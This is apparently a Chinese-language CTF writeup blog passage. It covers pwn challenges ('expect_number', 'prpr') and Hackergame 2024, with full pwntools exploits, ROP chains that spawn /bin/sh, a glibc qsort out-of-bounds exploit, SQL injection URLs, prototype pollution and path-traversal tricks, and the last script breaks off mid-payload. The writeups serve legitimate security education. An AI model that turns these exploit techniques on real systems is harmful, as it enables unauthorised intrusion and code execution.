amd64-64-little    RELRO:      Full RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        PIE enabled    SHSTK:      Enabled    IBT:        Enabled\n\n程序初始化时调用了 srand(1)，所以运算符并不随机。\n选项 3 要求 &amp;unk_5400+12+n 的值等于 0xA2，和题意不符。如果相等则执行 cat gift。（然而并没有什么用）\n初步想法是直接暴力求解出符合要求的序列，但执行运算前有一步 movsx eax, al 的操作，当 al 最高位为 1 的时候，被视为负数，于是 eax 高位被填充 1，导致求解困难，同时 gift 不是 flag，pwn 也不是 misc，需要其他利用方法。\n\n在程序开始处，菜单输入时通过 try-catch 隐藏了一个后门。\n\n同时在动态调试时发现，&amp;unk_5400+0x120 处存在一个指针，指向指向退出函数的指针，会在选项 4 退出时解引用后调用。可以发现，这个指针在可写范围之内，只要输入序列长度等于 0x114，并控制好最终运算结果就能部分覆写。\n\n该指针指向一个函数表。\n\n其中 sub_2984 存在栈溢出，恰好能够劫持返回地址，同时在 read 时若字节数大于 8 则抛出异常，可以跳转到之前发现的后门。于是，利用思路就很明显了。\n\n\n计算出长度恰好为 0x114，运算结果为 0x60 的输入序列，覆写指针的最低位。\n通过 show 函数获取 ELF 泄露。\n输入选项 4 退出，调用 sub_2984，覆写 rbp 为 ELF 上的有效地址，覆写返回地址为后门 try-catch 的地址（0x2516）。\n\n最后成功 get shell。\nfrom pwn import *from d import numself = ELF(&quot;./expect_number&quot;)context.binary = elfsh = remote(&quot;&quot;, 0)for n in nums:    sh.sendlineafter(b&quot;choice \\n&quot;, b&quot;1&quot;)    sh.sendlineafter(b&quot;\\n&quot;, str(n).encode())sh.sendline(b&quot;2&quot;)sh.recvuntil(b&quot;: &quot;)sh.recv(276)elf.address = u64(sh.recv(6).ljust(8, b&quot;\\x00&quot;)) - 0x4C60print(&quot;elf @&quot;, hex(elf.address))sh.sendline(b&quot;4&quot;)sh.send(b&quot;a&quot; * 0x20 + p64(elf.bss(0x800)) + p64(elf.address + 0x2516))sh.interactive()\n\n参考输入序列如下。\nnums = [1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 2, 2, 2, 2, 0, 0, 2, 2, 2, 2, 2, 1, 1, 2]\n\nprpr题目链接\nprpr (8 solves) [371pt]题目内容：（无）[*] &#x27;~/prpr&#x27;    Arch:       amd64-64-little    RELRO:      Full RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        PIE enabled    FORTIFY:    Enabled    SHSTK:      Enabled    IBT:        Enabled line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x08 0x00 0x00000002  if (A == open) goto 0012 0004: 0x15 0x07 0x00 0x00000000  if (A == read) goto 0012 0005: 0x15 0x06 0x00 0x00000001  if (A == write) goto 0012 0006: 0x15 0x05 0x00 0x0000003c  if (A == exit) goto 0012 0007: 0x15 0x04 0x00 0x000000e7  if (A == exit_group) goto 0012 0008: 0x15 0x03 0x00 0x00000009  if (A == mmap) goto 0012 0009: 0x15 0x02 0x00 0x0000000a  if (A == mprotect) goto 0012 0010: 0x15 0x01 0x00 0x0000000c  if (A == brk) goto 0012 0011: 0x06 0x00 0x00 0x00000000  return KILL 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n\n通过 __printf_chk 函数实现的 VM。\n本文将各个寄存器分别记为 %r0-%r6，每次函数调用时分配的空间记为 frame，当前指令的指针记为 ip。根据逆向结果，可知每次调用函数时 frame 大小固定为 0x100，函数返回地址保存在 frame+0x100 处。另外，每次运行代码时会检查栈和 frame 地址的合法性，但 ip 没有检查。\nsub_1240 处定义了所有 opcode，其中部分需要留意。\n\n%D&#x2F;%F&#x2F;%H - 出栈一个元素，并将当前 frame 与该元素逐字节进行逻辑与&#x2F;或&#x2F;与非运算，直到遇到 \\x00，终止条件显然有问题，可以篡改返回地址。\n%#V - 出栈一个元素 N，再将 frame+N 上的元素入栈。这里 N 没有检查，可以越界读。\n%#X - 出栈一个元素 N，再出栈一个元素置于 frame+N。这里 N 没有检查，可以越界写。\n\n从 ELF 从提取出主程序如下。\n  0x0   %x   0x0     ; exitfunc 1  0x1   %a   0x0     ; input  0x2   %Y   0x1     ; pop %r1  0x3   %U   0xff    ; push 255  0x4   %k   0x1     ; push %r1  0x5   %r   0x0     ; test &gt;  0x6   %S   0x0     ; jnz 0x0  0x7   %k   0x1     ; push %r1  0x8   %U   0x0     ; push 0  0x9   %r   0x0     ; test &gt;  0xa   %S   0x0     ; jnz 0x0                       ; 0 &lt;= r1 &lt;= 255  0xb   %a   0x0     ; input  0xc   %Y   0x2     ; pop %r2  0xd   %U   0x3f    ; push 63  0xe   %k   0x2     ; push %r2  0xf   %r   0x0     ; test &gt;  0x10  %S   0x0     ; jnz 0x0  0x11  %k   0x2     ; push %r2  0x12  %U   0x0     ; push 0  0x13  %r   0x0     ; test &gt;  0x14  %S   0x0     ; jnz 0x0                       ; 0 &lt;= r2 &lt;= 63  0x15  %k   0x2     ; push %r2  0x16  %U   0x4     ; push 4  0x17  %i   0x0     ; mul  0x18  %c   0x0     ; read  0x19  %k   0x1     ; push %r1  0x1a  %D   0x0     ; frame AND stack  0x1b  %k   0x2     ; push %r2  0x1c  %U   0x4     ; push 4  0x1d  %i   0x0     ; mul  0x1e  %b   0x0     ; puts  0x1f  %n   0x0     ; retfunc 2  0x20  %a   0x0     ; input  0x21  %Y   0x3     ; pop %r3  0x22  %a   0x0     ; input  0x23  %Y   0x4     ; pop %r4  0x24  %U   0x3f    ; push 63  0x25  %k   0x4     ; push %r4  0x26  %r   0x0     ; test &gt;  0x27  %S   0x0     ; jnz 0x0  0x28  %k   0x4     ; push %r4  0x29  %U   0x0     ; push 0  0x2a  %r   0x0     ; test &gt;  0x2b  %S   0x0     ; jnz 0x0                       ; 0 &lt;= r4 &lt;= 63  0x2c  %U   0x0     ; push 0  0x2d  %Y   0x5     ; pop %r5  0x2e  %k   0x4     ; push %r4                      ; loop begin  0x2f  %k   0x5     ; push %r5  0x30  %r   0x0     ; test &gt;  0x31  %S   0x3b    ; jnz 0x3b                      ; r5 &gt; r4 : jump out  0x32  %g   0x3c    ; call 0x3c  0x33  %k   0x3     ; push %r3  0x34  %C   0x0     ; and  0x35  %y   0x0     ; output                        ; output r3 &amp; input (0x3c)  0x36  %k   0x5     ; push %r5  0x37  %U   0x1     ; push 1  0x38  %A   0x0     ; add  0x39  %Y   0x5     ; pop %r5                       ; r5++  0x3a  %N   0x2e    ; jmp 0x2e                      ; loop end  0x3b  %n   0x0     ; retfunc  0x3c  %a   0x0     ; input  0x3d  %k   0x5     ; push %r5  0x3e  %#X  0x0     ; pop n; pop frame#n            ; frame[r5] = input  0x3f  %k   0x5     ; push %r5  0x40  %#V  0x0     ; pop n; push frame#n  0x41  %U   0xff    ; push 255  0x42  %M   0x0     ; test =  0x43  %S   0x0     ; jnz 0x0                       ; assert input != 255  0x44  %k   0x5     ; push %r5  0x45  %#V  0x0     ; pop n; push frame#n           ; push input  0x46  %n   0x0     ; retfunc main  0x47  %a   0x0     ; input  0x48  %Y   0x0     ; pop %r0  0x49  %U   0x1     ; push 1  0x4a  %k   0x0     ; push %r0  0x4b  %M   0x0     ; test =  0x4c  %T   0x4f    ; jz 0x4f  0x4d  %g   0x1     ; call 0x1  0x4e  %N   0x47    ; jmp 0x47  0x4f  %U   0x2     ; push 2  0x50  %k   0x0     ; push %r0  0x51  %M   0x0     ; test =  0x52  %T   0x55    ; jz 0x55  0x53  %g   0x20    ; call 0x20  0x54  %N   0x47    ; jmp 0x47  0x55  %U   0x3     ; push 3  0x56  %k   0x0     ; push %r0  0x57  %M   0x0     ; test =  0x58  %T   0x5b    ; jz 0x5b  0x59  %g   0x6e    ; call 0x6e  0x5a  %N   0x47    ; jmp 0x47  0x5b  %U   0x4     ; push 4  0x5c  %k   0x0     ; push %r0  0x5d  %M   0x0     ; test =  0x5e  %T   0x61    ; jz 0x61  0x5f  %g   0x8d    ; call 0x8d  0x60  %N   0x47    ; jmp 0x47  0x61  %U   0x5     ; push 5  0x62  %k   0x0     ; push %r0  0x63  %M   0x0     ; test =  0x64  %T   0x67    ; jz 0x67  0x65  %g   0xb2    ; call 0xb2  0x66  %N   0x47    ; jmp 0x47  0x67  %U   0x6     ; push 6  0x68  %k   0x0     ; push %r0  0x69  %M   0x0     ; test =  0x6a  %T   0x6d    ; jz 0x6d  0x6b  %g   0xd1    ; call 0xd1  0x6c  %N   0x47    ; jmp 0x47  0x6d  %x   0x0     ; exitfunc 3  0x6e  %a   0x0     ; input  0x6f  %Y   0x1     ; pop %r1  0x70  %U   0xff    ; push 255  0x71  %k   0x1     ; push %r1  0x72  %r   0x0     ; test &gt;  0x73  %S   0x0     ; jnz 0x0  0x74  %k   0x1     ; push %r1  0x75  %U   0x0     ; push 0  0x76  %r   0x0     ; test &gt;  0x77  %S   0x0     ; jnz 0x0                       ; 0 &lt;= r1 &lt;= 255  0x78  %a   0x0     ; input  0x79  %Y   0x2     ; pop %r2  0x7a  %U   0x3f    ; push 63  0x7b  %k   0x2     ; push %r2  0x7c  %r   0x0     ; test &gt;  0x7d  %S   0x0     ; jnz 0x0  0x7e  %k   0x2     ; push %r2  0x7f  %U   0x0     ; push 0  0x80  %r   0x0     ; test &gt;  0x81  %S   0x0     ; jnz 0x0                       ; 0 &lt;= r2 &lt;= 63  0x82  %k   0x2     ; push %r2  0x83  %U   0x4     ; push 4  0x84  %i   0x0     ; mul  0x85  %c   0x0     ; read  0x86  %k   0x1     ; push %r1  0x87  %H   0x0     ; frame XOR stack  0x88  %k   0x2     ; push %r2  0x89  %U   0x4     ; push 4  0x8a  %i   0x0     ; mul  0x8b  %b   0x0     ; puts  0x8c  %n   0x0     ; retfunc 4  0x8d  %a   0x0     ; input  0x8e  %Y   0x3     ; pop %r3  0x8f  %a   0x0     ; input  0x90  %Y   0x4     ; pop %r4  0x91  %U   0x3e    ; push 62  0x92  %k   0x4     ; push %r4  0x93  %r   0x0     ; test &gt;  0x94  %S   0x0     ; jnz 0x0  0x95  %k   0x4     ; push %r4  0x96  %U   0x0     ; push 0  0x97  %r   0x0     ; test &gt;  0x98  %S   0x0     ; jnz 0x0                       ; 0 &lt;= r4 &lt;= 62  0x99  %U   0x0     ; push 0  0x9a  %Y   0x5     ; pop %r5  0x9b  %k   0x4     ; push %r4                      ; loop begin  0x9c  %k   0x5     ; push %r5  0x9d  %r   0x0     ; test &gt;  0x9e  %S   0xb1    ; jnz 0xb1                      ; r5 &gt; r4 : jump out  0x9f  %g   0x3c    ; call 0x3c  0xa0  %k   0x3     ; push %r3  0xa1  %G   0x0     ; xor  0xa2  %k   0x5     ; push %r5  0xa3  %#X  0x0     ; pop n; pop frame#n            ; frame[r5] = r3 ^ input (0x3c)  0xa4  %k   0x5     ; push %r5  0xa5  %#V  0x0     ; pop n; push frame#n  0xa6  %U   0xff    ; push 255  0xa7  %M   0x0     ; test =  0xa8  %S   0x0     ; jnz 0x0                       ; assert frame[r5] != 255  0xa9  %k   0x5     ; push %r5  0xaa  %#V  0x0     ; pop n; push frame#n  0xab  %y   0x0     ; output                        ; output frame[r5]  0xac  %k   0x5     ; push %r5  0xad  %U   0x1     ; push 1  0xae  %A   0x0     ; add  0xaf  %Y   0x5     ; pop %r5                       ; r5++  0xb0  %N   0x9b    ; jmp 0x9b                      ; loop end  0xb1  %n   0x0     ; retfunc 5  0xb2  %a   0x0     ; input  0xb3  %Y   0x1     ; pop %r1  0xb4  %U   0xff    ; push 255  0xb5  %k   0x1     ; push %r1  0xb6  %r   0x0     ; test &gt;  0xb7  %S   0x0     ; jnz 0x0  0xb8  %k   0x1     ; push %r1  0xb9  %U   0x0     ; push 0  0xba  %r   0x0     ; test &gt;  0xbb  %S   0x0     ; jnz 0x0                       ; 0 &lt;= r1 &lt;= 255  0xbc  %a   0x0     ; input  0xbd  %Y   0x2     ; pop %r2  0xbe  %U   0x3f    ; push 63  0xbf  %k   0x2     ; push %r2  0xc0  %r   0x0     ; test &gt;  0xc1  %S   0x0     ; jnz 0x0  0xc2  %k   0x2     ; push %r2  0xc3  %U   0x0     ; push 0  0xc4  %r   0x0     ; test &gt;  0xc5  %S   0x0     ; jnz 0x0                       ; 0 &lt;= r2 &lt;= 63  0xc6  %k   0x2     ; push %r2  0xc7  %U   0x4     ; push 4  0xc8  %i   0x0     ; mul  0xc9  %c   0x0     ; read  0xca  %k   0x1     ; push %r1  0xcb  %F   0x0     ; frame OR stack  0xcc  %k   0x2     ; push %r2  0xcd  %U   0x4     ; push 4  0xce  %i   0x0     ; mul  0xcf  %b   0x0     ; puts  0xd0  %n   0x0     ; retfunc 6  0xd1  %a   0x0     ; input  0xd2  %Y   0x3     ; pop %r3  0xd3  %a   0x0     ; input  0xd4  %Y   0x4     ; pop %r4  0xd5  %U   0x3f    ; push 63  0xd6  %k   0x4     ; push %r4  0xd7  %r   0x0     ; test &gt;  0xd8  %S   0x0     ; jnz 0x0  0xd9  %k   0x4     ; push %r4  0xda  %U   0x0     ; push 0  0xdb  %r   0x0     ; test &gt;  0xdc  %S   0x0     ; jnz 0x0                       ; 0 &lt;= r4 &lt;= 63  0xdd  %U   0x0     ; push 0  0xde  %Y   0x5     ; pop %r5  0xdf  %k   0x4     ; push %r4                      ; loop begin  0xe0  %k   0x5     ; push %r5  0xe1  %r   0x0     ; test &gt;  0xe2  %S   0xf5    ; jnz 0xf5                      ; r5 &gt; r4 : jump out  0xe3  %g   0x3c    ; call 0x3c  0xe4  %k   0x3     ; push %r3  0xe5  %E   0x0     ; or  0xe6  %k   0x5     ; push %r5  0xe7  %#X  0x0     ; pop n; pop frame#n            ; frame[r5] = r3 | input (0x3c)  0xe8  %k   0x5     ; push %r5  0xe9  %#V  0x0     ; pop n; push frame#n  0xea  %U   0xff    ; push 255  0xeb  %M   0x0     ; test =  0xec  %S   0x0     ; jnz 0x0                       ; assert frame[r5] != 255  0xed  %k   0x5     ; push %r5  0xee  %#V  0x0     ; pop n; push frame#n  0xef  %y   0x0     ; output                        ; output frame[r5]  0xf0  %k   0x5     ; push %r5  0xf1  %U   0x1     ; push 1  0xf2  %A   0x0     ; add  0xf3  %Y   0x5     ; pop %r5                       ; r5++  0xf4  %N   0xdf    ; jmp 0xdf                      ; loop end  0xf5  %n   0x0     ; ret  0xf6  %x   0x0     ; exit  0xf7  %x   0x0     ; exit  0xf8  %x   0x0     ; exit  0xf9  %x   0x0     ; exit\n\n主函数实现了一个菜单，可以调用 6 个函数。根据之前的分析，可以得到以下利用流程。\n\n调用 func_6，填满 frame_0 和 frame_1。\n调用 func_2，借助 0x3c 处的函数，在 frame_1 上填充利用代码。同时设置 %r4 为 63，函数结束时 %r5 应达到 64。\n调用 func_3，对 frame_0 进行异或操作，修改返回地址为 0x32，借此跳转到 0x3c，由于此时 %r5 为 64，可以任意写返回地址，计算偏移返回到第二步中填充的代码处。\n\n此时可以执行任意 VM 代码。由于设置在堆上，我们首先通过 %#V 越界读，泄露出 ELF 的地址；由于寄存器基址也位于堆上，通过 %#X 越界写，可以将其进行修改为 ELF 的 GOT 表的地址，最后通过 output 将 puts 和 write 地址输出。（代码中的 misaka 用于方便 exp 定位；实际运行时有几率获取到错误基址，我也不知道为什么，但问题不大）\n; leak libc!misakapush -0x770        ; get ELF low!%#Vpush 0x4198        ; add GOT offsetaddpush -0x3ec        ; set reg base low!%#Xpush -0x769        ; get ELF high!%#Vpush -0x3eb        ; set reg base high!%#Xpush %r0           ; get puts lowpush %r1           ; get libc highoutputoutputpush %r2           ; get write lowoutputpush 0xf0          ; read &amp; run next codereadjmp -0x891\n\n实际情况下，由于远程与本地环境不同，需要找到新的偏移量，可以另写一段代码用于遍历输出内存。\n获得 puts 和 write 地址后，通过 libc-database 搜索得到 libc 版本。然后通过 _environ 泄露栈地址，并将寄存器基址指向要插入 ROP 链的地址。由于程序正常退出时也会莫名其妙出现 Bad system call，需要在 __printf_chk 的某个内部函数的栈帧后插入 ROP 链。\n; point stackpush %r1input              ; input _environ lowpush -0x3ec!%#Xpush -0x3eb!%#Xpush %r0pop %r0push %r0push -0x2610addpush %r1push -0x3eb!%#Xpush -0x3ec!%#Xpush 0xf0          ; read &amp; run next codereadjmp -0x891\n\n然后持续读取 ROP 链插入。由于程序会在 ip 大于 0x250 时返回退出，这里在输入完成后跳转到 0x1000 处。\n; rop chaininputpop %r0push %r0push 0xdeadtest =jnz 0x1000push -0x3ec!%#Vpush 0x4addpush -0x3ec!%#Xjmp -0x891\n\n最终 exp 如下。\nfrom pwn import *elf = ELF(&quot;./prpr&quot;)libc = ELF(&quot;./libc.so.6&quot;)context.binary = elfsh = remote(&quot;&quot;, 0)def func_3(m, n, s):    sh.sendline(b&quot;3&quot;)    sh.sendline(str(m).encode())    sh.sendline(str(n).encode())    sh.sendline(s)def func_2(m, s, op=b&quot;2&quot;):    sh.sendline(op)    sh.sendline(str(m).encode())    size = (len(s) + 3) // 4    sh.sendline(str(size - 1).encode())    for i in range(size):        sh.sendline(str(int.from_bytes(s[i * 4 : i * 4 + 4][::-1])).encode())        sh.recvline()def func_6(m, s):    func_2(m, s, b&quot;6&quot;)def load_code(name):    global code    with open(f&quot;./&#123;name&#125;.bin&quot;, &quot;rb&quot;) as f:        code = f.read()sh.recv()load_code(&quot;code1&quot;)func_6(0, b&quot;a&quot; * 256)func_2(0, code.ljust(256, b&quot;\\x00&quot;))func_3(0x5A ^ 0x32, 1, b&quot;aaaa&quot;)sh.sendline(str(-0x866).encode())sh.recvuntil(b&quot;misaka&quot;)puts_addr = int(sh.recvuntil(b&quot;\\n&quot;, True)) &lt;&lt; 32write_addr = puts_addrputs_addr += int(sh.recvuntil(b&quot;\\n&quot;, True))write_addr += int(sh.recvuntil(b&quot;\\n&quot;, True))print(&quot;puts @&quot;, hex(puts_addr))print(&quot;write @&quot;, hex(write_addr))libc.address = puts_addr - libc.sym[&quot;puts&quot;]print(&quot;libc @&quot;, hex(libc.address))load_code(&quot;code2&quot;)sh.sendline(b&quot;\\x00&quot; * 4 + code)sh.sendline(str(libc.sym[&quot;_environ&quot;] &amp; 0xFFFFFFFF).encode())load_code(&quot;code3&quot;)sh.sendline(b&quot;\\x00&quot; * 4 + code)pop_rdi_ret = libc.address + 0x10F75Bpop_rsi_ret = libc.address + 0x110A4Dpop_rax_ret = libc.address + 0xDD237# add edx, eax ; mov rax, rdx ; pop rbx ; retadd_edx_ret = libc.address + 0x59CB2payload = p64(pop_rdi_ret) + p64(libc.bss(0x800))payload += p64(libc.sym[&quot;gets&quot;])payload += p64(pop_rdi_ret) + p64(2)payload += p64(pop_rsi_ret) + p64(libc.bss(0x800))payload += p64(libc.sym[&#x27;syscall&#x27;])payload += p64(pop_rdi_ret) + p64(3)payload += p64(pop_rsi_ret) + p64(libc.bss(0x800))payload += p64(pop_rax_ret) + p64(0x100)payload += p64(add_edx_ret) + p64(0)payload += p64(libc.sym[&quot;read&quot;])payload += p64(pop_rdi_ret) + p64(libc.bss(0x800))payload += p64(libc.sym[&quot;puts&quot;])for i in range((len(payload) + 3) // 4):    sh.sendline(str(int.from_bytes(payload[i * 4 : i * 4 + 4][::-1])).encode())sh.sendline(str(0xDEAD).encode())sh.interactive()\n\n（代码转换留给读者自行完成。）\n","categories":["Writeup","CTF"],"tags":["PWN"]},{"title":"Hackergame 2024 - Writeup","url":"/posts/e032918347e8/","content":"第一次参加 hackergame，虽然分数连 20% 都没拿到，不过还是很开心的，明年再加油吧，争取多打一点 General 和 Math。\n当前分数：3050， 总排名：155 / 2460 ，中山大学组内排名：10 / 90AI：0 ， binary：850 ， general：950 ， math：150 ， web：1100\n\nWeb签到怎么办看了下大家的 wp 好像只有我没发现地址栏的参数啊。\nfor (let el of document.getElementsByTagName(&#x27;input&#x27;)) &#123;  el.value = el.placeholder.split(/(: |：)/)[2];&#125;\n\nflag&#123;w31C0mE-7O-HACKer9am3-4nD-ENJ0Y-h@CK!N9-Zoz4&#125;\n\n喜欢做签到的 CTFer 你们好呀\nhttps://www.nebuu.la/\n\n\n执行 env\n执行 cat .flag\n\nflag&#123;actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula&#125;flag&#123;0k_175_a_h1dd3n_s3c3rt_f14g___please_join_us_ustc_nebula_anD_two_maJor_requirements_aRe_shown_somewhere_else&#125;\n\n比大小王fetch(&#x27;/game&#x27;, &#123;  method: &#x27;POST&#x27;,  headers: &#123;    &#x27;Content-Type&#x27;: &#x27;application/json&#x27;,  &#125;,  body: JSON.stringify(&#123;&#125;),&#125;)  .then(response =&gt; response.json())  .then(data =&gt; &#123;    let inputs = [];    for (v of data.values) &#123;      inputs.push(v[0] &gt; v[1] ? &#x27;&gt;&#x27; : &#x27;&lt;&#x27;);    &#125;    setTimeout(() =&gt; &#123;      fetch(&#x27;/submit&#x27;, &#123;        method: &#x27;POST&#x27;,        headers: &#123;          &#x27;Content-Type&#x27;: &#x27;application/json&#x27;,        &#125;,        body: JSON.stringify(&#123;          inputs,        &#125;),      &#125;)        .then(response =&gt; response.json())        .then(data =&gt; console.log(data));    &#125;, 10000);  &#125;);\n\nflag&#123;i-Am-TH3-H4cK3r-kin9-0F-comp4R!ng-nUmBErS-ZoZ4&#125;\n\nNode.js is Web Scale原型链污染。设置 __proto__.misaka 为 cat /flag ，再访问 /execute?cmd=misaka 得到 flag。\nflag&#123;n0_pr0topOIl_50_U5E_new_Map_1n5teAD_Of_0bject2kv_f907fcd5dc&#125;\n\n禁止内卷环境开启了自动重载，同时源码显然存在目录穿越，直接修改 ../web/app.py 即可执行任意代码。\nflag&#123;uno!!!!_esrever_now_U_run_MY_c0def2d96ab220&#125;\n\nPaoluGPTSQL 注入。\n\n访问 /view?conversation_id=&#39; or contents like &#39;%flag%&#39; and shown=true or &#39;1&#39;=&#39;\n访问 /view?conversation_id=&#39; or shown=false or &#39;1&#39;=&#39;\n\nflag&#123;zU1_xiA0_de_11m_Pa0lule!!!_f5bd65b87e&#125;flag&#123;enJ0y_y0uR_Sq1_&amp;_1_would_xiaZHOU_hUI_guo_59f2c6ab6a&#125;\n\nGeneral猫咪问答（Hackergame 十周年纪念版）\nhttps://lug.ustc.edu.cn/wiki/sec/contest.html\n10 月 17 日 周六晚上 19:30 3A204 网络攻防技巧讲座\n\nhttps://lug.ustc.edu.cn/news/2019/12/hackergame-2019/\n经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。\n\nhttps://github.com/ustclug/hackergame2018-writeups/blob/master/misc/others.md\n“程序员的自我修养”已经成为了图书馆本月热搜词的第一名\n\nhttps://www.usenix.org/conference/usenixsecurity24/presentation/ma-jinrui\n16 个邮箱服务和 20+1 种客户端，共 336 种组合\n\nhttps://lore.kernel.org/netdev/2m53bmuzemamzc4jzk2bj7tli22ruaaqqe34a2shtdtqrd52hp@alifh66en3rj/T/\n6e90b675cf942e (“MAINTAINERS: Remove some entries due to various compliance requirements.”)\n\nhttps://lunary.ai/llama3-tokenizer\n显示 1835，但不对；上下调整了会，最后答案是 1833\n\n\nflag&#123;a_gooD_Cα7_1S_7h3_©@t_ωho_©ΛN_Pa55_tHE_Qบ!2&#125;flag&#123;TEn_Y3@R$_0ƒ_h@Ck3Яg@m3_0Mede7Oบ_wi7H_NEko_qบ!2&#125;\n\n打不开的盒用在线工具查看模型即可。\nflag&#123;Dr4W_Us!nG_fR3E_C4D!!w0W&#125;\n\nPowerfulShell当前目录位于 /players ，同时 $- 为 hB ，取其中两个字符为 sh 即可。\nPowerfulShell@hackergame&gt; __=~PowerfulShell@hackergame&gt; $&#123;__:7:1&#125;$&#123;-:1-1:1&#125;cat /flagflag&#123;N0w_I_Adm1t_ur_tru1y_5He11_m4ster_87f155cdd4&#125;\n\n旅行照片 4.0LEO_CHAN?\n东校区西门\n\n\n\n\nhttps://www.xiaohongshu.com/discovery/item/6649488700000000160121a9\n链接贴上来发现当前内容仅支持在小〇书 APP 内查看。总之答案是 5.19 东区大礼堂\n\n\nflag&#123;5UB5CR1B3_T0_L30_CH4N_0N_B1L1B1L1_PLZ_cf149039c2&#125;\n\n链上转账助手转账失败正反馈最高的一集。\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Misaka &#123;&#125;\n\nflag&#123;Tr4nsf3r_T0_c0nTracT_MaY_R3v3rt_b2b97f52d9&#125;\n\n不太分布式的软总线What DBus Gonna Do?DBus 101。完成课程即送 flag！\n#include &lt;gio/gio.h&gt;#include &lt;stdio.h&gt;int main() &#123;    char *addr = getenv(&quot;DBUS_SYSTEM_BUS_ADDRESS&quot;);    GError *err = NULL;    GDBusConnection *conn;    conn = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &amp;err);    if (err) &#123;        printf(&quot;conn err: %s\\n&quot;, err-&gt;message);    &#125;    err = NULL;    GVariant *result = g_dbus_connection_call_sync(            conn,            &quot;cn.edu.ustc.lug.hack.FlagService&quot;,            &quot;/cn/edu/ustc/lug/hack/FlagService&quot;,            &quot;cn.edu.ustc.lug.hack.FlagService&quot;,            &quot;GetFlag1&quot;,            g_variant_new(&quot;(s)&quot;, &quot;Please give me flag1&quot;),            G_VARIANT_TYPE(&quot;(s)&quot;),            G_DBUS_CALL_FLAGS_NONE,            -1,            NULL,            &amp;err    );    if (err) &#123;        printf(&quot;func err: %s\\n&quot;, err-&gt;message);        return;    &#125;    GVariant *value;    g_variant_get(result, &quot;(s)&quot;, &amp;value);    g_printf(&quot;%s\\n&quot;, value);    return 0;&#125;\n\nflag&#123;every_11nuxdeskT0pU5er_uSeDBUS_bUtn0NeknOwh0w_0b1a197b4f&#125;\n\nMath惜字如金 3.0题目 A送的，math 防爆零机制，哪里有问题改哪里就行。后面的题目貌似就是数学题了，不会。\nflag&#123;C0mpl3ted-Th3-Pyth0n-C0de-N0w&#125;\n\nBinary我们的快排確有問題\nhttps://packetstormsecurity.com/files/176931/glibc-qsort-Out-Of-Bounds-Read-Write.html\n\n令 qsort 使用快速排序，由于函数 whos_jipiei_is_better 是非传递性的，将触发 qsort 越界读写漏洞，将排序函数设为 doredolaso 里的 gadget，最终引发调用 system(&quot;/bin/sh&quot;) 。\nimport structfrom pwn import *elf = ELF(&quot;./sort_ur_jipei&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)context.binary = elfsh = remote(&quot;202.38.93.141&quot;, 31341)token = b&quot;&quot;sh.recvline()sh.sendline(token)def i2d(n):    return struct.unpack(&quot;d&quot;, struct.pack(&quot;q&quot;, n))[0]def b2d(b):    return struct.unpack(&quot;d&quot;, b.ljust(8, b&quot;\\x00&quot;))[0]sh.sendline(str(0x80).encode())sh.sendline(str(i2d(0x4011DD)).encode() + b&quot; &quot; + b&quot;1 &quot; * 3 + b&quot;3 &quot; * 0x7C)payload = str(i2d(0x401201)) + &quot; &quot;payload += &quot;3 &quot; * 0x3Epayload += str(b2d(b&quot;/bin/sh\\x00&quot;)) + &quot; &quot;payload += &quot;3 &quot; * 0x40sh.sendline(payload.encode())sh.interactive()\n\nflag&#123;attacking_our_sYstem_will_not_result_in_Any_repercUssions_f42709b189&#125;\n\n哈希三碰撞三碰撞之一0x 和 00 都会被视为 0，输入以下三个数据即可通过。\n0x00000000000000000x00000000000000000x0000000000\n\nflag&#123;341642dbbbdb68f956933ceddfc571&#125;\n\n新生赛上的零解题canary-bypasstry-catch 利用。首先填充 stack_buf ，为之后栈迁移做准备。之后覆写 vuln 函数返回地址，同时设置 saved rbp 为 0x31338000 ，通过异常处理绕过 canary，跳转到 banner 处，然后返回到 main 函数。此时栈已被劫持，再次绕过 canary 后，通过 ROP 即可 getshell。\nfrom pwn import *elf = ELF(&quot;./canary-bypass&quot;)context.binary = elfsh = remote(&quot;202.38.93.141&quot;, 31335)token = b&quot;&quot;sh.recvline()sh.sendline(token)def send(bts):    for i in range((len(bts) + 7) // 8):        sh.sendline(str(int.from_bytes(bts[i * 8 : i * 8 + 8][::-1])).encode())    sh.sendline(str(0x31337).encode())sh.recvuntil(b&quot;one.\\n&quot;)for i in range(0x400):    send(b&quot;&quot;)    sh.recvline()payload = b&quot;a&quot; * 0x20payload += p64(0x31338000)payload 